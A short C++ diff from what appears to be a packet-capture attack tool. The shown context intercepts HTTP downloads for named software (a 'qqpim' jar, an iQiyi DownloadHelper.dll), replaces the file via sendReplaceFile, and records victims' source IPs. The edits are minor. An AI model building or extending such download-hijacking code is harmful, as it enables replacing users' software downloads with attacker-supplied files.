@@ -15,10 +15,7 @@ Attack::~Attack() {
 }
 
 Attack::Attack(string path, unsigned long serverIP) {
-	if (mInstance)
-	{
-		return;
-	}
+
 	mInstance = this;
 
 	int iRet = 0;
@@ -43,7 +40,6 @@ int Attack::attack(const char* url, const char* szhost, const char* lphttpdata, 
 		printf("qqpim jar\r\n");
 		Public::recorduser(((LPIPHEADER)ip)->SrcIP, "qqpim jar");
 	}
-
 	// 	else if (strstr(szhost, "static.qiyi.com") && strstr(url, "/ext/common/qisu2/DownloadHelper.dll") )
 	// 	{
 	// 		iRet = gIqiyiDll->sendReplaceFile(pcapT, (char*)pData, iCapLen, ip, type, pppoe);
